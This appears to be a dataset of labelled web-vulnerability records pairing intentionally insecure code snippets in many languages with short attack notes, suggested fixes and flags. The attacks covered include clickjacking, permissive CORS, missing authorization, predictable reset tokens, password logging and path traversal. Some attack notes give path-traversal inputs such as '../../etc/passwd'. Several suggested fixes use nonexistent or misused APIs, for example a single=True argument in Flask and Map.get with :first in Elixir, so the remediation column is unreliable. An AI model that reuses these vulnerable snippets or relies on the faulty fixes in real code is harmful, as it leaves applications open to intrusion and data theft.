vuln-203,Python,Clickjacking,Missing X-Frame-Options.,@app.route('/') def index(): return 'page',Iframe to capture clicks.,app.config['X_FRAME_OPTIONS'] = 'DENY',@app.route('/') def index(): return 'page',False,False,False,False,42,False,True,False,Other,1
vuln-204,Java,Clickjacking,No frame protection.,"@GetMapping(""/"") public String index() { return ""page""; }",Iframe for clickjacking.,"response.setHeader(""X-Frame-Options"", ""DENY"");","@GetMapping(""/"") public String index() { return ""page""; }",False,False,False,False,57,False,True,False,Other,1
vuln-205,PHP,Clickjacking,No X-Frame-Options header.,echo 'page';,Iframe to trick user clicks.,header('X-Frame-Options: DENY');,echo 'page';,False,False,False,False,12,False,True,False,Other,1
vuln-206,Ruby,Clickjacking,No frame protection.,get '/' do 'page' end,Iframe for clickjacking.,response.headers['X-Frame-Options'] = 'DENY',get '/' do 'page' end,False,False,False,False,21,False,True,False,Other,1
vuln-207,Go,Clickjacking,Missing X-Frame-Options.,"http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, ""page"") })",Iframe attack.,"w.Header().Set(""X-Frame-Options"", ""DENY"")","http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, ""page"") })",False,False,False,False,92,False,True,False,Other,1
vuln-208,C# (.NET),Clickjacking,No X-Frame-Options.,"[HttpGet(""/"")] public IActionResult Index() { return Content(""page""); }",Iframe to capture clicks.,"Response.Headers.Add(""X-Frame-Options"", ""DENY"");","[HttpGet(""/"")] public IActionResult Index() { return Content(""page""); }",False,False,False,False,71,False,True,False,Other,1
vuln-209,Kotlin,Clickjacking,No frame protection.,"get(""/"") { call.respondText(""page"") }",Iframe attack.,"call.response.header(""X-Frame-Options"", ""DENY"")","get(""/"") { call.respondText(""page"") }",False,False,False,False,37,False,True,False,Other,1
vuln-210,Scala,Clickjacking,No X-Frame-Options.,"get(""/"") { Ok(""page"") }",Iframe to trick clicks.,"response.header(""X-Frame-Options"", ""DENY"")","get(""/"") { Ok(""page"") }",False,False,False,False,23,False,True,False,Other,1
vuln-211,Rust,Clickjacking,No frame protection.,"router.get(""/"", |_, res| res.render_text(""page""))",Iframe attack.,"res.header(header::X_FRAME_OPTIONS, ""DENY"")","router.get(""/"", |_, res| res.render_text(""page""))",False,False,False,False,49,False,True,False,Other,1
vuln-212,Elixir,Clickjacking,No X-Frame-Options.,"get ""/"", PageController, :index",Iframe for clickjacking.,"put_resp_header(conn, ""x-frame-options"", ""DENY"")","get ""/"", PageController, :index",False,False,False,False,31,False,True,False,Other,1
vuln-213,Perl,Clickjacking,No frame protection.,$r->print('page');,Iframe to capture clicks.,"$r->header_out('X-Frame-Options', 'DENY');",$r->print('page');,False,False,False,False,18,False,True,False,Other,1
vuln-214,Node.js,HTTP Parameter Pollution,Multiple parameters with same name.,const value = req.query.param; db.query(value);,?param=1&param=2 to confuse logic.,Use first value: req.query.param[0] or validate.,const value = req.query.param; db.query(value);,True,True,False,False,47,False,False,False,Other,1
vuln-215,Python,HTTP Parameter Pollution,Handling multiple query params.,value = request.args.get('param'); db.execute(value),?param=1&param=2 to bypass checks.,"Use request.args.get('param', single=True)",value = request.args.get('param'); db.execute(value),True,True,False,True,52,False,True,False,Other,1
vuln-216,Java,HTTP Parameter Pollution,Unvalidated multiple params.,"String param = request.getParameter(""param""); db.query(param);",?param=1&param=2 to alter logic.,Use getParameterValues and take first.,"String param = request.getParameter(""param""); db.query(param);",True,True,False,False,62,False,True,False,Other,1
vuln-217,PHP,HTTP Parameter Pollution,Multiple query params.,$value = $_GET['param']; $db->query($value);,?param=1&param=2 to confuse app.,Use array_key_first($_GET['param']),$value = $_GET['param']; $db->query($value);,True,True,False,False,44,False,True,False,Other,1
vuln-218,Ruby,HTTP Parameter Pollution,Unvalidated params.,value = params[:param]; User.where(value: value),?param=1&param=2 to manipulate.,Use params[:param].first,value = params[:param]; User.where(value: value),True,False,False,False,48,False,False,False,Other,1
vuln-219,Go,HTTP Parameter Pollution,Multiple query params.,"value := r.URL.Query().Get(""param""); db.Query(value)",?param=1&param=2 to bypass.,"Use r.URL.Query()[""param""][0]","value := r.URL.Query().Get(""param""); db.Query(value)",True,True,False,False,52,False,True,False,Other,1
vuln-220,C# (.NET),HTTP Parameter Pollution,Unvalidated query params.,"var value = Request.Query[""param""]; db.Execute(value);",?param=1&param=2 to confuse.,"Use Request.Query[""param""].First()","var value = Request.Query[""param""]; db.Execute(value);",True,True,False,True,54,False,True,False,Other,1
vuln-221,Kotlin,HTTP Parameter Pollution,Multiple params not handled.,"val value = call.request.queryParameters[""param""]; db.query(value)",?param=1&param=2,"Use queryParameters.values(""param"")?.first()","val value = call.request.queryParameters[""param""]; db.query(value)",True,True,False,False,66,False,True,False,Other,1
vuln-222,Scala,HTTP Parameter Pollution,Unvalidated params.,"val value = params(""param""); db.query(value)",?param=1&param=2,"Use params.getAll(""param"").head","val value = params(""param""); db.query(value)",True,True,False,False,44,False,True,False,Other,1
vuln-223,Rust,HTTP Parameter Pollution,Multiple query params.,"let value = req.query(""param"")?; db.query(&value);",?param=1&param=2,"Use req.query::<Vec<String>>(""param"")?.first()","let value = req.query(""param"")?; db.query(&value);",True,True,False,False,50,False,True,False,Other,1
vuln-224,Elixir,HTTP Parameter Pollution,Unvalidated query params.,"value = params[""param""]; Repo.query(value)",?param=1&param=2,"Use Map.get(params, ""param"", :first)","value = params[""param""]; Repo.query(value)",True,True,False,False,42,False,True,False,Other,1
vuln-225,Perl,HTTP Parameter Pollution,Multiple params not handled.,my $value = $r->param('param'); $dbh->do($value);,?param=1&param=2,"Use $r->param('param', 'first')",my $value = $r->param('param'); $dbh->do($value);,True,False,False,False,49,False,True,False,Other,1
vuln-226,Node.js,Insecure CORS,Overly permissive CORS policy.,app.use(cors({ origin: true }));,Cross-origin requests from malicious sites.,Specify origins: cors({ origin: 'https://trusted.com' }),app.use(cors({ origin: true }));,False,False,False,False,32,False,False,False,Other,1
vuln-227,Python,Insecure CORS,Allowing all origins in CORS.,"CORS(app, resources={r""/*"": {""origins"": ""*""}})",Malicious site makes requests.,"CORS(app, resources={r""/*"": {""origins"": ""https://trusted.com""}})","CORS(app, resources={r""/*"": {""origins"": ""*""}})",False,False,False,False,46,False,True,False,Other,1
vuln-228,Java,Insecure CORS,Permissive CORS configuration.,"@CrossOrigin(origins = ""*"") @GetMapping(""/data"") public Data getData() {...}",Cross-origin data access.,"@CrossOrigin(origins = ""https://trusted.com"")","@CrossOrigin(origins = ""*"") @GetMapping(""/data"") public Data getData() {...}",False,False,False,False,76,False,True,False,Other,1
vuln-229,PHP,Insecure CORS,Allowing all origins.,header('Access-Control-Allow-Origin: *');,Malicious site requests.,header('Access-Control-Allow-Origin: https://trusted.com');,header('Access-Control-Allow-Origin: *');,False,False,False,False,41,False,True,False,Other,1
vuln-230,Ruby,Insecure CORS,Permissive CORS policy.,headers['Access-Control-Allow-Origin'] = '*',Cross-origin attacks.,headers['Access-Control-Allow-Origin'] = 'https://trusted.com',headers['Access-Control-Allow-Origin'] = '*',False,False,False,False,44,False,True,False,Other,1
vuln-231,Go,Insecure CORS,Permissive CORS configuration allowing all origins.,"w.Header().Set(""Access-Control-Allow-Origin"", ""*"")",Malicious sites perform cross-origin requests.,"Set specific origin: w.Header().Set(""Access-Control-Allow-Origin"", ""https://trusted.com"")","w.Header().Set(""Access-Control-Allow-Origin"", ""*"")",False,False,False,False,50,False,True,False,Other,1
vuln-232,C# (.NET),Insecure CORS,Allowing all origins in CORS policy.,app.UseCors(builder => builder.AllowAnyOrigin());,Cross-origin data theft from malicious sites.,"Specify origins: builder.WithOrigins(""https://trusted.com"")",app.UseCors(builder => builder.AllowAnyOrigin());,False,False,False,False,49,False,False,False,Other,1
vuln-233,Kotlin,Insecure CORS,Permissive CORS settings in Ktor.,install(CORS) { anyHost() },Malicious cross-origin requests.,"Configure: host(""trusted.com"", schemes = listOf(""https""))",install(CORS) { anyHost() },False,False,False,False,27,False,False,False,Other,1
vuln-234,Scala,Insecure CORS,Allowing all origins in Play Framework.,"response.setHeader(""Access-Control-Allow-Origin"", ""*"")",Cross-origin attacks from untrusted sites.,"Set: response.setHeader(""Access-Control-Allow-Origin"", ""https://trusted.com"")","response.setHeader(""Access-Control-Allow-Origin"", ""*"")",False,False,False,False,54,False,True,False,Other,1
vuln-235,Rust,Insecure CORS,Permissive CORS headers.,"res.header(header::ACCESS_CONTROL_ALLOW_ORIGIN, ""*"")",Malicious sites access resources.,"Use: res.header(header::ACCESS_CONTROL_ALLOW_ORIGIN, ""https://trusted.com"")","res.header(header::ACCESS_CONTROL_ALLOW_ORIGIN, ""*"")",False,False,False,False,52,False,True,False,Other,1
vuln-236,Elixir,Insecure CORS,Allowing all origins in Phoenix.,"plug CORSPlug, origin: ""*""",Cross-origin requests from malicious sites.,"Set: plug CORSPlug, origin: [""https://trusted.com""]","plug CORSPlug, origin: ""*""",False,False,False,False,26,False,True,False,Other,1
vuln-237,Perl,Insecure CORS,Permissive CORS headers.,"$r->header_out('Access-Control-Allow-Origin', '*');",Cross-origin data access.,"$r->header_out('Access-Control-Allow-Origin', 'https://trusted.com');","$r->header_out('Access-Control-Allow-Origin', '*');",False,False,False,False,51,False,True,False,Other,1
vuln-238,Node.js,Broken Access Control,No authorization checks for sensitive endpoints.,"app.get('/admin', (req, res) => res.send('Admin Panel'));",Access /admin without auth.,Check role: if (req.user.role === 'admin') res.send('Admin Panel'); else res.status(403);,"app.get('/admin', (req, res) => res.send('Admin Panel'));",False,False,False,False,57,False,True,False,Other,1
vuln-239,Python,Broken Access Control,No permission checks for restricted routes.,@app.route('/admin') def admin(): return 'Admin Panel',Directly access /admin.,Check: if current_user.is_admin(): return 'Admin Panel'; else: abort(403),@app.route('/admin') def admin(): return 'Admin Panel',False,False,False,False,54,False,True,False,Other,1
vuln-240,Java,Broken Access Control,Missing role-based access checks.,"@GetMapping(""/admin"") public String admin() { return ""Admin Panel""; }",Access /admin without authorization.,"@PreAuthorize(""hasRole('ADMIN')"")","@GetMapping(""/admin"") public String admin() { return ""Admin Panel""; }",False,False,False,False,69,False,True,False,Other,1
vuln-241,PHP,Broken Access Control,No access control for admin routes.,if ($_SERVER['REQUEST_URI'] === '/admin') { echo 'Admin Panel'; },Visit /admin directly.,Check: if ($user->isAdmin()) { echo 'Admin Panel'; } else { http_response_code(403); },if ($_SERVER['REQUEST_URI'] === '/admin') { echo 'Admin Panel'; },False,False,False,False,65,False,True,False,Other,1
vuln-242,Ruby,Broken Access Control,No authorization for sensitive actions.,get '/admin' do 'Admin Panel' end,Access /admin without checks.,before { redirect '/' unless current_user.admin? },get '/admin' do 'Admin Panel' end,False,False,False,False,33,False,True,False,Other,1
vuln-243,Go,Broken Access Control,No role checks for restricted endpoint.,"http.HandleFunc(""/admin"", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, ""Admin Panel"") })",Directly access /admin.,"Check: if user.Role == ""admin"" { fmt.Fprint(w, ""Admin Panel"") } else { http.Error(w, ""Forbidden"", 403) }","http.HandleFunc(""/admin"", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, ""Admin Panel"") })",False,False,False,False,104,False,True,False,Other,1
vuln-244,C# (.NET),Broken Access Control,Missing authorization for admin endpoint.,"[HttpGet(""admin"")] public IActionResult Admin() { return Ok(""Admin Panel""); }",Access /admin without auth.,"[Authorize(Roles = ""Admin"")]","[HttpGet(""admin"")] public IActionResult Admin() { return Ok(""Admin Panel""); }",False,False,False,False,77,False,True,False,Other,1
vuln-245,Kotlin,Broken Access Control,No role-based access control.,"get(""/admin"") { call.respondText(""Admin Panel"") }",Directly access /admin.,"Check: if (call.principal<UserPrincipal>()?.role == ""admin"") { call.respondText(""Admin Panel"") } else { call.respond(HttpStatusCode.Forbidden) }","get(""/admin"") { call.respondText(""Admin Panel"") }",False,False,False,False,49,False,True,False,Other,1
vuln-246,Scala,Broken Access Control,No authorization checks.,"get(""/admin"") { Ok(""Admin Panel"") }",Access /admin without permission.,"Check: if (user.isAdmin) Ok(""Admin Panel"") else Status(403)","get(""/admin"") { Ok(""Admin Panel"") }",False,False,False,False,35,False,True,False,Other,1
vuln-247,Rust,Broken Access Control,No access control for sensitive route.,"router.get(""/admin"", |_, res| res.render_text(""Admin Panel""))",Directly access /admin.,"Check: if user.role == ""admin"" { res.render_text(""Admin Panel"") } else { res.status(StatusCode::FORBIDDEN) }","router.get(""/admin"", |_, res| res.render_text(""Admin Panel""))",False,False,False,False,61,False,True,False,Other,1
vuln-248,Elixir,Broken Access Control,No permission checks for admin route.,"get ""/admin"", AdminController, :index",Access /admin directly.,"plug :check_admin; def check_admin(conn, _) do if conn.assigns[:user].admin, do: conn, else: halt(conn)","get ""/admin"", AdminController, :index",False,False,False,False,37,False,True,False,Other,1
vuln-249,Perl,Broken Access Control,No authorization for admin page.,if ($r->uri eq '/admin') { $r->print('Admin Panel'); },Visit /admin without auth.,Check: $r->print('Admin Panel') if $user->is_admin; else $r->status(403);,if ($r->uri eq '/admin') { $r->print('Admin Panel'); },False,False,False,False,54,False,True,False,Other,1
vuln-250,Node.js,Insecure Password Reset,Predictable reset tokens.,const resetToken = user.id + Date.now();,Guess token using user ID and timestamp.,Use crypto.randomBytes(32).toString('hex') for tokens.,const resetToken = user.id + Date.now();,False,False,False,False,40,False,False,True,Other,1
vuln-252,Java,Insecure Password Reset,Predictable reset tokens.,String resetToken = user.getId() + System.currentTimeMillis();,Guess token using ID and time.,Use SecureRandom to generate 32-byte token.,String resetToken = user.getId() + System.currentTimeMillis();,False,False,False,True,62,False,False,True,Other,1
vuln-253,PHP,Insecure Password Reset,Predictable reset tokens.,$reset_token = $user_id . time();,Predict token with user ID and timestamp.,Use random_bytes(32) and bin2hex.,$reset_token = $user_id . time();,False,False,False,False,33,False,False,False,Other,1
vuln-254,Ruby,Insecure Password Reset,Predictable reset tokens.,"reset_token = ""#{user.id}#{Time.now.to_i}""",Guess token based on ID and time.,Use SecureRandom.urlsafe_base64(32),"reset_token = ""#{user.id}#{Time.now.to_i}""",False,False,False,False,42,False,True,False,Other,1
vuln-255,Go,Insecure Password Reset,Predictable reset tokens.,"resetToken := fmt.Sprintf(""%d%d"", user.ID, time.Now().Unix())",Predict token using ID and time.,Use crypto/rand to generate 32-byte token.,"resetToken := fmt.Sprintf(""%d%d"", user.ID, time.Now().Unix())",False,False,False,False,61,False,True,False,Other,1
vuln-256,C# (.NET),Insecure Password Reset,Predictable reset tokens.,var resetToken = user.Id + DateTime.Now.Ticks;,Guess token with ID and timestamp.,Use RNGCryptoServiceProvider for random token.,var resetToken = user.Id + DateTime.Now.Ticks;,False,False,False,False,46,False,False,True,Other,1
vuln-257,Kotlin,Insecure Password Reset,Predictable reset tokens.,"val resetToken = ""${user.id}${System.currentTimeMillis()}""",Predict token using ID and time.,Use SecureRandom for 32-byte token.,"val resetToken = ""${user.id}${System.currentTimeMillis()}""",False,False,False,True,58,False,True,True,Other,1
vuln-258,Scala,Insecure Password Reset,Predictable reset tokens.,"val resetToken = s""${user.id}${System.currentTimeMillis}""",Guess token with ID and time.,Use SecureRandom for token generation.,"val resetToken = s""${user.id}${System.currentTimeMillis}""",False,False,False,True,57,False,True,True,Other,1
vuln-260,Elixir,Insecure Password Reset,Predictable reset tokens.,"reset_token = ""#{user.id}#{:os.system_time(:second)}""",Guess token with ID and timestamp.,Use :crypto.strong_rand_bytes(32) |> Base.url_encode64(),"reset_token = ""#{user.id}#{:os.system_time(:second)}""",False,False,False,True,53,False,True,False,Other,1
vuln-261,Perl,Insecure Password Reset,Predictable reset tokens.,my $reset_token = $user_id . time();,Predict token based on ID and time.,Use Crypt::Random::Source for token.,my $reset_token = $user_id . time();,False,False,False,False,36,False,False,False,Other,1
vuln-262,Node.js,Improper Error Handling,Exposing stack traces to users.,"app.get('/', (req, res) => { throw new Error('Test'); });",Extract sensitive info from stack traces.,"Use error middleware: app.use((err, req, res, next) => res.status(500).send('Error'))","app.get('/', (req, res) => { throw new Error('Test'); });",False,False,False,False,57,False,True,False,Other,1
vuln-263,Python,Improper Error Handling,Leaking stack traces in responses.,@app.route('/') def index(): raise Exception('Test'),Analyze stack traces for sensitive data.,"app.errorhandler(Exception)(lambda e: ('Error', 500))",@app.route('/') def index(): raise Exception('Test'),False,False,False,False,52,False,True,False,Other,1
vuln-264,Java,Improper Error Handling,Exposing stack traces in response.,"@GetMapping(""/"") public String index() { throw new RuntimeException(""Test""); }",Extract sensitive info from traces.,"@ExceptionHandler(Exception.class) public ResponseEntity<?> handle(Exception e) { return ResponseEntity.status(500).body(""Error""); }","@GetMapping(""/"") public String index() { throw new RuntimeException(""Test""); }",False,False,False,False,78,False,True,False,Other,1
vuln-265,PHP,Improper Error Handling,Displaying PHP errors to users.,"ini_set('display_errors', 1); throw new Exception('Test');",Extract info from error output.,"ini_set('display_errors', 0); set_error_handler(function() { http_response_code(500); echo 'Error'; });","ini_set('display_errors', 1); throw new Exception('Test');",False,False,False,False,58,False,True,False,Other,1
vuln-266,Ruby,Improper Error Handling,Leaking stack traces.,get '/' do raise 'Test' end,Analyze stack traces for secrets.,"configure { set :show_exceptions, false }; error { 'Error' }",get '/' do raise 'Test' end,False,False,False,False,27,False,True,False,Other,1
vuln-267,Go,Improper Error Handling,Exposing error details.,"http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { panic(""Test"") })",Extract sensitive data from panic output.,"Use recover: defer func() { if r := recover(); r != nil { http.Error(w, ""Error"", 500) } }()","http.HandleFunc(""/"", func(w http.ResponseWriter, r *http.Request) { panic(""Test"") })",False,False,False,False,84,False,True,False,Other,1
vuln-268,C# (.NET),Improper Error Handling,Leaking stack traces.,"[HttpGet(""/"")] public IActionResult Index() { throw new Exception(""Test""); }",Extract info from stack traces.,"app.UseExceptionHandler(err => err.Run(async ctx => await ctx.Response.WriteAsync(""Error"")));","[HttpGet(""/"")] public IActionResult Index() { throw new Exception(""Test""); }",False,False,False,False,76,False,True,False,Other,1
vuln-269,Kotlin,Improper Error Handling,Exposing stack traces in Ktor.,"get(""/"") { throw Exception(""Test"") }",Analyze stack traces for secrets.,"install(StatusPages) { exception<Exception> { call.respond(HttpStatusCode.InternalServerError, ""Error"") } }","get(""/"") { throw Exception(""Test"") }",False,False,False,False,36,False,True,False,Other,1
vuln-270,Scala,Improper Error Handling,Leaking stack traces.,"get(""/"") { throw new Exception(""Test"") }",Extract sensitive data from traces.,"Action { implicit request => try { ... } catch { case e: Exception => InternalServerError(""Error"") } }","get(""/"") { throw new Exception(""Test"") }",False,False,False,False,40,False,True,False,Other,1
vuln-271,Rust,Improper Error Handling,Exposing panic details.,"router.get(""/"", |_, _| panic!(""Test""));",Extract info from panic output.,Use catch_unwind: std::panic::catch_unwind(|| ...).unwrap_or_else(|_| Err(StatusCode::INTERNAL_SERVER_ERROR)),"router.get(""/"", |_, _| panic!(""Test""));",False,False,False,False,39,False,True,False,Other,1
vuln-272,Elixir,Improper Error Handling,Leaking error details.,"get ""/"", PageController, :index # raises error",Analyze error output for secrets.,"plug :error_handler; def error_handler(conn, _) do send_resp(conn, 500, ""Error"") end","get ""/"", PageController, :index # raises error",False,False,False,False,46,False,True,False,Other,1
vuln-273,Perl,Improper Error Handling,Exposing error messages.,"die ""Test error"";",Extract sensitive info from errors.,eval { ... }; if ($@) { $r->print('Error'); $r->status(500); },"die ""Test error"";",False,False,False,False,17,False,True,False,Other,1
vuln-274,Node.js,Insecure File Download,No validation on file downloads.,res.download(`files/${req.query.file}`);,Download ../../etc/passwd.,"Validate: path.resolve(baseDir, file); check prefix.",res.download(`files/${req.query.file}`);,True,True,False,False,40,False,False,True,File_Handling,1
vuln-275,Python,Insecure File Download,Serving files with user input.,return send_file(request.args.get('file')),Access ../../etc/passwd.,"Use os.path.join(base_dir, file); validate path.",return send_file(request.args.get('file')),False,False,False,False,42,False,True,False,File_Handling,1
vuln-276,Java,Insecure File Download,Serving unvalidated files.,"Files.copy(Paths.get(""files/"" + request.getParameter(""file"")), response.getOutputStream());",Download ../../etc/passwd.,"Use Paths.get(baseDir, file).normalize(); check prefix.","Files.copy(Paths.get(""files/"" + request.getParameter(""file"")), response.getOutputStream());",True,False,False,False,91,False,True,True,File_Handling,1
vuln-277,PHP,Insecure File Download,Serving files with user input.,readfile('files/' . $_GET['file']);,Access ../../etc/passwd.,Validate: realpath('files/' . $file) starts with base dir.,readfile('files/' . $_GET['file']);,False,False,True,False,35,False,True,False,File_Handling,1
vuln-278,Ruby,Insecure File Download,Unvalidated file serving.,"send_file ""files/#{params[:file]}""",Download ../../etc/passwd.,Use File.expand_path; check base dir.,"send_file ""files/#{params[:file]}""",True,False,False,False,34,False,True,False,File_Handling,1
vuln-279,Go,Insecure File Download,Serving files with user input.,"http.ServeFile(w, r, ""files/""+r.URL.Query().Get(""file""))",Access ../../etc/passwd.,"Use filepath.Join(baseDir, file); validate path.","http.ServeFile(w, r, ""files/""+r.URL.Query().Get(""file""))",True,True,False,False,56,False,True,True,File_Handling,1
vuln-280,C# (.NET),Insecure File Download,Serving unvalidated files.,"return PhysicalFile($""files/{Request.Query[""file""]}"", ""application/octet-stream"");",Download ../../web.config.,"Validate: Path.Combine(baseDir, file); check prefix.","return PhysicalFile($""files/{Request.Query[""file""]}"", ""application/octet-stream"");",True,True,False,False,82,False,True,False,File_Handling,1
vuln-281,Kotlin,Insecure File Download,Serving files with user input.,"call.respondFile(File(""files/${call.request.queryParameters[""file""]}""))",Access ../../etc/passwd.,"Use File(baseDir, file).canonicalPath; check prefix.","call.respondFile(File(""files/${call.request.queryParameters[""file""]}""))",True,True,False,False,71,False,True,True,File_Handling,1
vuln-282,Scala,Insecure File Download,Unvalidated file serving.,"Ok.sendFile(new File(s""files/${params(""file"")}""))",Download ../../etc/passwd.,"Validate: new File(baseDir, file).getCanonicalPath startsWith baseDir.","Ok.sendFile(new File(s""files/${params(""file"")}""))",True,False,False,False,49,False,True,True,File_Handling,1
vuln-283,Rust,Insecure File Download,Serving files with user input.,"fs::read_to_string(&req.query(""file"")?).map(|c| res.render_text(c))",Access ../../etc/passwd.,Use Path::new(base_dir).join(file).canonicalize(); check prefix.,"fs::read_to_string(&req.query(""file"")?).map(|c| res.render_text(c))",True,True,False,False,67,False,True,False,File_Handling,1
vuln-284,Elixir,Insecure File Download,Serving unvalidated files.,"send_download(conn, {:file, ""files/"" <> params[""file""]}",Download ../../etc/passwd.,"Validate: Path.expand(""files/"" <> file) starts with base dir.","send_download(conn, {:file, ""files/"" <> params[""file""]}",True,False,False,False,55,False,True,False,File_Handling,1
vuln-285,Perl,Insecure File Download,Serving files with user input.,"open(my $fh, '<', ""files/$filename""); $r->sendfile($fh);",Access ../../etc/passwd.,"Validate: realpath(""files/$filename"") =~ /^$base_dir/.","open(my $fh, '<', ""files/$filename""); $r->sendfile($fh);",False,False,True,False,56,False,True,False,File_Handling,1
vuln-286,Node.js,Unvalidated Input in GraphQL,No input validation in GraphQL resolvers.,"const resolvers = { Query: { user: (_, { id }) => db.findUser(id) } };",Inject malicious IDs or SQL.,Validate: if (!/^[0-9]+$/.test(id)) throw Error('Invalid ID');,"const resolvers = { Query: { user: (_, { id }) => db.findUser(id) } };",True,True,False,False,70,False,False,False,Other,1
vuln-287,Python,Unvalidated Input in GraphQL,No validation in Graphene resolvers.,"class Query(graphene.ObjectType): user = graphene.Field(User, id=graphene.String()); def resolve_user(self, info, id): return db.get_user(id)",Inject malicious input.,Validate: if not id.isdigit(): raise ValueError('Invalid ID'),"class Query(graphene.ObjectType): user = graphene.Field(User, id=graphene.String()); def resolve_user(self, info, id): return db.get_user(id)",True,True,False,False,141,False,False,False,Other,1
vuln-288,Java,Unvalidated Input in GraphQL,No input validation in GraphQL-Java.,"@GraphQLField public User user(@GraphQLArgument(name = ""id"") String id) { return db.findUser(id); }",Inject malicious IDs.,"Validate: if (!id.matches(""^[0-9]+$"")) throw new IllegalArgumentException();","@GraphQLField public User user(@GraphQLArgument(name = ""id"") String id) { return db.findUser(id); }",False,False,False,False,99,False,True,False,Other,1
vuln-289,PHP,Unvalidated Input in GraphQL,No validation in GraphQL-PHP resolvers.,"'user' => function ($root, $args) { return $db->findUser($args['id']); }",Inject malicious input.,Validate: if (!ctype_digit($args['id'])) throw new Exception('Invalid ID');,"'user' => function ($root, $args) { return $db->findUser($args['id']); }",False,False,False,False,72,False,True,False,Other,1
vuln-290,Ruby,Unvalidated Input in GraphQL,No validation in GraphQL-Ruby.,"field :user, Types::UserType, null: true do argument :id, ID end; def user(id:) User.find(id) end",Inject malicious IDs.,Validate: raise 'Invalid ID' unless id =~ /^[0-9]+$/;,"field :user, Types::UserType, null: true do argument :id, ID end; def user(id:) User.find(id) end",False,False,False,False,97,False,False,False,Other,1
vuln-291,Go,Unvalidated Input in GraphQL,No validation in gqlgen resolvers.,"func (r *Resolver) User(ctx context.Context, id string) (*model.User, error) { return db.FindUser(id), nil }",Inject malicious input.,"Validate: if !regexp.MustCompile(`^[0-9]+$`).MatchString(id) { return nil, errors.New(""Invalid ID"") }","func (r *Resolver) User(ctx context.Context, id string) (*model.User, error) { return db.FindUser(id), nil }",False,False,False,False,108,False,False,False,Other,1
vuln-292,C# (.NET),Unvalidated Input in GraphQL,No validation in HotChocolate resolvers.,public User GetUser(string id) => db.FindUser(id);,Inject malicious IDs.,"Validate: if (!Regex.IsMatch(id, ""^[0-9]+$"")) throw new ArgumentException();",public User GetUser(string id) => db.FindUser(id);,False,False,False,False,50,False,False,False,Other,1
vuln-293,Kotlin,Unvalidated Input in GraphQL,No validation in GraphQL-Kotlin.,fun user(id: String): User = db.findUser(id),Inject malicious input.,"Validate: if (!id.matches(Regex(""^[0-9]+$""))) throw IllegalArgumentException(""Invalid ID"")",fun user(id: String): User = db.findUser(id),False,False,False,False,44,False,False,False,Other,1
vuln-294,Scala,Unvalidated Input in GraphQL,No validation in Sangria resolvers.,"Field(""user"", OptionType(UserType), arguments = ID :: Nil, resolve = ctx => db.findUser(ctx.arg(ID)))",Inject malicious IDs.,"Validate: if (ctx.arg(ID).matches(""^[0-9]+$"")) db.findUser else throw new Exception","Field(""user"", OptionType(UserType), arguments = ID :: Nil, resolve = ctx => db.findUser(ctx.arg(ID)))",False,False,False,False,101,False,True,False,Other,1
vuln-295,Rust,Unvalidated Input in GraphQL,No validation in Juniper resolvers.,fn user(id: String) -> Option<User> { db.find_user(&id) },Inject malicious input.,Validate: if id.chars().all(|c| c.is_digit(10)) { db.find_user(&id) } else { None },fn user(id: String) -> Option<User> { db.find_user(&id) },False,False,False,False,57,False,False,False,Other,1
vuln-296,Elixir,Unvalidated Input in GraphQL,No validation in Absinthe resolvers.,"field :user, :user do arg :id, non_null(:string); resolve fn %{id: id}, _ -> {:ok, Repo.get(User, id)} end end",Inject malicious IDs.,"Validate: if String.match?(id, ~r/^[0-9]+$/) do Repo.get(User, id) else {:error, ""Invalid ID""} end","field :user, :user do arg :id, non_null(:string); resolve fn %{id: id}, _ -> {:ok, Repo.get(User, id)} end end",False,False,False,False,110,False,False,False,Other,1
vuln-297,Perl,Unvalidated Input in GraphQL,No validation in GraphQL resolvers.,sub user { my ($args) = @_; return $db->find_user($args->{id}); },Inject malicious input.,Validate: return undef unless $args->{id} =~ /^[0-9]+$/;,sub user { my ($args) = @_; return $db->find_user($args->{id}); },False,False,False,False,65,False,False,False,Other,1
vuln-298,Node.js,Insecure Logging,Logging sensitive data.,"console.log(`User login: ${user.email}, ${user.password}`);",Access logs to extract credentials.,Avoid logging sensitive data: console.log(`User login: ${user.id}`);,"console.log(`User login: ${user.email}, ${user.password}`);",False,False,False,False,59,False,False,True,Other,1
vuln-299,Python,Insecure Logging,Logging sensitive information.,"logging.info(f'User login: {user.email}, {user.password}')",Read logs for credentials.,Log safely: logging.info(f'User login: {user.id}'),"logging.info(f'User login: {user.email}, {user.password}')",False,False,False,False,58,False,True,False,Other,1
vuln-301,PHP,Insecure Logging,Logging sensitive data to unprotected logs.,"error_log('User login: ' . $user['email'] . ', ' . $user['password']);",Access log files to extract credentials or PII.,Avoid logging sensitive data: error_log('User login: ' . $user['id']); Use secure log storage.,"error_log('User login: ' . $user['email'] . ', ' . $user['password']);",False,False,False,False,70,False,True,False,Other,1
vuln-302,Ruby,Insecure Logging,Logging sensitive information in plain text.,"Rails.logger.info ""User login: #{user.email}, #{user.password}""",Read logs to obtain credentials or session tokens.,"Log only non-sensitive data: Rails.logger.info ""User login: #{user.id}""","Rails.logger.info ""User login: #{user.email}, #{user.password}""",False,False,False,False,63,False,True,False,Other,1
vuln-303,Go,Insecure Logging,Logging sensitive data to stdout or files.,"log.Printf(""User login: %s, %s"", user.Email, user.Password)",Access logs via exposed endpoints or file leaks.,"Log: log.Printf(""User login: %s"", user.ID); Use structured logging with redaction.","log.Printf(""User login: %s, %s"", user.Email, user.Password)",False,False,False,False,59,False,True,True,Other,1
vuln-304,C# (.NET),Insecure Logging,Logging sensitive data without redaction.,"logger.LogInformation(""User login: {Email}, {Password}"", user.Email, user.Password);",Extract credentials from log files or monitoring systems.,"Log: logger.LogInformation(""User login: {Id}"", user.Id); Use Serilog with redaction.","logger.LogInformation(""User login: {Email}, {Password}"", user.Email, user.Password);",False,False,False,False,84,False,True,False,Other,1
vuln-306,Scala,Insecure Logging,Logging sensitive data without sanitization.,"logger.info(s""User login: ${user.email}, ${user.password}"")",Extract PII or credentials from logs.,"Log: logger.info(s""User login: ${user.id}""); Use secure logging frameworks.","logger.info(s""User login: ${user.email}, ${user.password}"")",False,False,False,False,59,False,True,True,Other,1
